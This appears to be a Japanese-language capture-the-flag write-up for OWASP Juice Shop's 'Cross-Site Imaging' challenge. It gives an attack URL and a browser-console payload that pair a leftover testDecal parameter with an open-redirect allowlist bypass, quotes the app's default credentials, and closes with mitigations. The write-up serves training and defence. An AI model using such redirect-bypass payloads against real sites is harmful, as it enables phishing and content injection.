# Cross-Site Imaging ✅

**難易度:** ⭐⭐⭐⭐⭐
**カテゴリ:** Security Misconfiguration
**目標:** 配送ボックスにクロスドメインの画像（かわいい猫）を表示させる

## 思考プロセス

1. チャレンジ名「Cross-Site Imaging」から、異なるドメインの画像を読み込ませる攻撃と推測
2. 最初は SVG インジェクションかと思ったが、ソースコードを調査
3. `deluxe-membership` ページに `testDecal` という隠しパラメータを発見
4. リダイレクトエンドポイントの Allowlist バイパスと組み合わせることで解決

## ソースコード分析

**ファイル:** `test/cypress/e2e/deluxe.spec.ts:3-14`

```javascript
describe('challenge "svgInjection"', () => {
  it('should be possible to pass in a forgotten test parameter', () => {
    cy.login({ email: 'jim', password: 'ncc-1701' })
    cy.location().then((loc) => {
      cy.visit(
        `/#/deluxe-membership?testDecal=${encodeURIComponent(
          `../../..${loc.pathname}/redirect?to=https://placecats.com/g/200/100?x=https://github.com/juice-shop/juice-shop`
        )}`
      )
    })
    cy.expectChallengeSolved({ challenge: 'Cross-Site Imaging' })
  })
})
```

**脆弱性の構造:**
1. `testDecal` パラメータが画像 URL として使用される（開発用パラメータが残存）
2. リダイレクトエンドポイント `/redirect` が存在
3. Allowlist チェックは `url.includes("github.com/juice-shop/juice-shop")` で実装
4. クエリパラメータに許可 URL を含めることでチェックをバイパス可能

## 実行手順

### 手順1: ログイン
任意のユーザーでログイン（例: `jim@juice-sh.op` / `ncc-1701`）

### 手順2: 攻撃 URL にアクセス

```
http://localhost:3000/#/deluxe-membership?testDecal=..%2F..%2F..%2Fredirect%3Fto%3Dhttps:%2F%2Fplacecats.com%2Fg%2F200%2F100%3Fx%3Dhttps:%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop
```

## コード/ペイロード

```javascript
// ブラウザコンソールで実行
const payload = encodeURIComponent(
  `../../../redirect?to=https://placecats.com/g/200/100?x=https://github.com/juice-shop/juice-shop`
);
window.location.href = `/#/deluxe-membership?testDecal=${payload}`;
```

**ペイロード解説:**
- `../../../redirect` - 相対パスでリダイレクトエンドポイントに到達
- `to=https://placecats.com/g/200/100` - 外部ドメイン（猫画像サービス）
- `?x=https://github.com/juice-shop/juice-shop` - Allowlist バイパス用のダミーパラメータ

## 解説

### なぜこの攻撃が成功するか

1. **テストパラメータの残存**
   - `testDecal` は開発/テスト用のパラメータ
   - 本番環境で無効化されていない

2. **Allowlist バイパス**
   ```javascript
   // 脆弱なコード（推測）
   if (url.includes("github.com/juice-shop/juice-shop")) {
     redirect(url);  // 許可
   }
   ```
   - `includes()` はURL全体を検索するため、クエリパラメータに含めるだけでバイパス可能

3. **攻撃の流れ**
   ```
   testDecal=../../../redirect?to=外部URL?x=許可URL
          ↓
   deluxe-membership ページが testDecal を画像として読み込み
          ↓
   /redirect エンドポイントにリクエスト
          ↓
   Allowlist チェック: "github.com/juice-shop/juice-shop" が含まれる → OK
          ↓
   外部ドメイン (placecats.com) にリダイレクト
          ↓
   猫画像が配送ボックスに表示される
   ```

### 対策

1. **テスト用パラメータの削除**
   ```javascript
   // 本番ビルドでは testDecal を無視する
   if (process.env.NODE_ENV === 'production') {
     delete req.query.testDecal;
   }
   ```

2. **URL 検証の厳格化**
   ```javascript
   // 正しい検証方法
   const url = new URL(redirectUrl);
   const allowedHosts = ['github.com'];
   if (!allowedHosts.includes(url.hostname)) {
     throw new Error('Redirect not allowed');
   }
   ```

3. **画像 URL のドメイン制限**
   - 画像は自サーバーからのみ読み込むよう制限
   - CSP で `img-src` を厳格に設定

## 副産物

この攻撃を実行すると **Allowlist Bypass** (難易度4) も同時に解決される。
